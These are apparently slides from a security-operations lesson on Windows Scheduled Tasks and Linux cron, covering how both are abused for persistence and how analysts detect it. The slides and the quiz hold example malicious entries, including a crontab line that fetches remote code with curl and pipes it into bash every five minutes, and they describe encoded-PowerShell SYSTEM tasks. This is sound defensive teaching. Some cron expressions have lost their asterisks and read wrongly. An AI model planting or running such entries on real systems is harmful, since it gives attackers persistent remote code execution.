A scheduled job says: run this, whenever that happens.

Windows uses Scheduled Tasks, Linux uses cron. Both are essential automation, and both are among the most common ways to make malware persistent.

One trigger plus one action. Everything in the lesson, on both platforms, hangs off that pair.

Section 1 of 7

Why scheduling exists

Backups, updates, log rotation and cleanup run so humans do not have to remember.

HACKTHESOCLesson 73Scheduled tasks and cron6 / 33

Every scheduled job has two halves

When

Trigger

A time ("2:00 a.m. daily"), an interval ("every 15 minutes"), or a system event ("at startup", "at user logon").

What

Action

Usually a program, script or command.

This applies identically to Windows and Linux, which is why the detection questions later are the same on both.
HACKTHESOCLesson 73Scheduled tasks and cron7 / 33

Two intruder problems solved at once

Persistence

A task set to run at startup relaunches malware on every boot, so a reboot no longer removes the attacker.

Stealth and resilience

An hourly task quietly re-establishes a connection, hiding among many legitimate scheduled jobs.

MITRE ATT&CK groups the abuse as Scheduled Task/Job (T1053), with a sub-technique per platform.

The capability is completely legitimate. That is exactly what makes it useful to attackers.

Windows scheduled tasks

Task Scheduler pairs one or more triggers with one or more actions.

HACKTHESOCLesson 73Scheduled tasks and cron9 / 33

Rich triggers are part of why tasks are abusable

  • Time or recurring scheduleDaily, hourly, every N minutes.
  • At system startupA favourite for persistence: runs on every boot.
  • At user logonWhen a particular user, or any user, signs in.
  • On a system eventSuch as a specific log entry appearing.
Managed with the Task Scheduler app, schtasks.exe or PowerShell. Definitions are XML files under C:\Windows\System32\Tasks, referenced in the Registry.
HACKTHESOCLesson 73Scheduled tasks and cron10 / 33

What attackers get, and the recurring giveaway

T1053.005

Why attackers use tasks

Automatic execution, a choice of boot, logon or interval, a chosen privileged account, and camouflage among dozens of real tasks.

The giveaway: the action

Legitimate maintenance runs a recognisable program. Malicious tasks run encoded PowerShell, a temp-folder script, or a suspicious binary.

Action, trigger and name together tell you whether a task belongs.

Anatomy of a task definition

The XML says when it runs, what it runs, and under what identity.

HACKTHESOCLesson 73Scheduled tasks and cron12 / 33

The XML elements an analyst reads

XML elementPurposeWhy it matters
<Author>Free-text name of who or what created the taskA useful lead, but the creator can set it to anything; confirm with the 4698 Subject fields
<Triggers>Logon, Boot, Time, Calendar, Event triggersBoot/Logon give the broadest re-execution
<Principal>Account and privilege level of the actionSYSTEM UserId + HighestAvailable = maximum privilege
<Exec>The <Command> and <Arguments>Where obfuscated PowerShell or odd binaries appear
<Hidden>Hides the task from the default GUI viewtrue is a real evasion; the task still runs
The principal is the concept the GUI summary hides. An EventTrigger can even fire in response to a specific log entry.
HACKTHESOCLesson 73Scheduled tasks and cron13 / 33

A task engineered for maximum privilege at every logon

  • S-1-5-18 is the well-known SID for LocalSystem
  • Hidden true keeps it off the casual GUI view
  • The action is obfuscated PowerShell, not an update binary
Each task is a file with no extension under C:\Windows\System32\Tasks\<TaskPath>, also registered at HKLM\...\Schedule\TaskCache. Check both filesystem and Registry. Registering a task with a SYSTEM principal or an any-user logon trigger requires admin rights.

Section 4 of 7

Linux cron jobs

The cron daemon wakes every minute and runs whatever is due.

HACKTHESOCLesson 73Scheduled tasks and cron15 / 33

Where cron jobs live, and attackers hide

Per-user crontabs

Edited with crontab -e, viewed with crontab -l.

System crontab

/etc/crontab and /etc/cron.d/: system-wide jobs, often as root.

Drop-in directories

/etc/cron.hourly/, daily, weekly, monthly: any script inside runs on that cadence.

Also systemd timers and the at command for one-off runs. Attackers use these too.

A malicious cron job often runs curl ... | bash or reopens a reverse shell on a tight interval: self-healing persistence in one line (T1053.003).
HACKTHESOCLesson 73Scheduled tasks and cron16 / 33

Read the five time fields, then the command

  • 0 3 * * = at 03:00 every day; /10 * * * * = every 10 minutes
  • Every minute or every few minutes is a common beaconing/persistence pattern
  • */35 in minutes means minute 0 and 35 of each hour, not every 35 minutes
An asterisk means every. The step is evaluated inside its field's range and resets each hour, hence the */35 trap.
HACKTHESOCLesson 73Scheduled tasks and cron17 / 33

Cron shorthand triggers

ShorthandEquivalentRuns
@reboot(special)Once, each time the machine boots
@hourly0 * * * *At the top of every hour
@daily / @midnight0 0 * * *Once a day at 00:00
@weekly0 0 * * 0Sunday 00:00
@monthly0 0 1 * *The 1st at 00:00
@yearly / @annually0 0 1 1 *1 January 00:00
@reboot is the cron twin of a Windows on-startup task. An @reboot line pointing at /tmp or a curl-to-shell is textbook Linux persistence.

schtasks, crontab and systemd timers

The exact commands behind both automation and attacker persistence.

HACKTHESOCLesson 73Scheduled tasks and cron19 / 33

A legitimate task, and the shape attackers use

The query is a real built-in update task running a recognisable DLL. The create has a legitimate-sounding name, an encoded PowerShell action, a boot trigger and SYSTEM, all captured in Event 4698. PowerShell's Register-ScheduledTask does the same.
HACKTHESOCLesson 73Scheduled tasks and cron20 / 33

Inspect other users' crontabs and timers

  • -u www-data (as root) checks a service account for planted persistence
  • Every two minutes, call out with the hostname so the attacker knows who checked in
A schtasks /create or crontab -e in EDR process history is often the clearest evidence a job was deliberately planted rather than always there.

Section 6 of 7

Detecting malicious scheduled jobs

Both platforms leave traces of creation and modification.

HACKTHESOCLesson 73Scheduled tasks and cron23 / 33

Where the evidence lives

Windows Security log

4698 task created, the headline signal with name and action. 4699 deleted, 4700/4701 enabled/disabled, 4702 updated.

TaskScheduler Operational

On by default. 106 registered, 140 updated, 141 deleted, tied to the acting user. Often the only record.

Linux

File-integrity monitoring of cron paths; auditd or EDR showing crontab -e or the cron daemon spawning bash, curl, or a /tmp script.

Also watch XML file creation under C:\Windows\System32\Tasks and schtasks /create command lines with their parent process.

On hosts where the 4698 family is not audited, the Operational log tells the same story.
HACKTHESOCLesson 73Scheduled tasks and cron24 / 33

Three questions for any job, on either platform

  1. 1When does it run?Startup, logon, or a suspiciously tight interval.
  2. 2What does it run?A recognisable program, or encoded PowerShell, a temp-folder binary, a shell download.
  3. 3Who or what created it?A software install, or a suspicious process or user.

Treat job creation and modification as inherently interesting, then correlate with the process tree and file activity.

Legitimate jobs are installed by software and run recognisable programs on sensible schedules. Odd name, hidden action, aggressive interval: that is the persistence you want.

Event 4698 fires on a workstation.

The alert

  • Name near-identical to the real Edge update task: masquerading
  • A real Edge task runs Edge's updater, not hidden encoded PowerShell
Masquerading from the process-tree lesson, applied to a task name instead of a process name.
HACKTHESOCLesson 73Scheduled tasks and cron27 / 33

From alert to confirmed compromise

  1. 1Spot the impersonationRight-looking name, wrong action.
  2. 2Check the triggerLogon of any user: broad, repeated re-execution.
  3. 3Decode and correlateBase64 hides a downloader; network logs show the domain contacted minutes after each logon.
  4. 4Check who created itAuthor CORP\j.chen is free text; the 4698 Subject fields confirm j.chen's session.
  5. 5Verdictj.chen's session was misused while elevated, likely after that morning's suspicious email.
Software deployments normally run as SYSTEM or through an installer. An any-user logon trigger with a SYSTEM principal needs admin rights, so either j.chen holds local admin it should not, or the attacker escalated first: chase that next.

Same attacker logic, different scheduler

Windows

Disguised task name, logon trigger, Base64-encoded PowerShell action.

Linux

/5 * * * curl ... | bash: tight interval, action hidden in a piped shell command.

Abuse a trusted scheduler, disguise the name, guarantee repeated execution, obfuscate the action.

Once the shared pattern is clear, any task or cron alert is triaged with the same three questions.

Key takeaways

  1. 01A scheduler runs an action on a trigger; Windows tasks and Linux cron are both abused for persistence (T1053).
  2. 02Task XML reveals Author, Triggers, Principal, Exec and Hidden; SYSTEM plus HighestAvailable is maximum privilege.
  3. 03Cron lives in user crontabs, /etc/crontab, /etc/cron.d and drop-in folders; @reboot is boot persistence.
  4. 04schtasks /create, Register-ScheduledTask, crontab -u and systemctl list-timers are what to look for.
  5. 05Detect with 4698 and 4699/4702, TaskScheduler 106/140/141, and cron FIM with auditd or EDR.
  6. 06Judge every job by when it runs, what it runs, and who created it: trust the 4698 Subject fields over Author.

Check your understanding, question 1 of 3

On a Linux web server, crontab -l -u www-data shows this entry, which is not in the build documentation: /5 * * * curl -s http://185.x.x.x/p | bash. How should you read it?

/5 in the minute field means every 5 minutes, and a per-user crontab runs as that user. Piping an external download into bash is recurring persistence (T1053.003). Every 5 hours would be 0 /5 * * *, and a boot-only job is @reboot.

Check your understanding, question 3 of 3

A 4698 event shows a new hidden PowerShell logon task whose XML lists Author: CORP\j.chen. Which field establishes who actually registered the task?

Windows fills SubjectUserName, SubjectDomainName and SubjectLogonId from the registering context, so they are the reliable record, here corroborating j.chen. Author is free text, a task can run as another account, and the trigger fires for anyone.
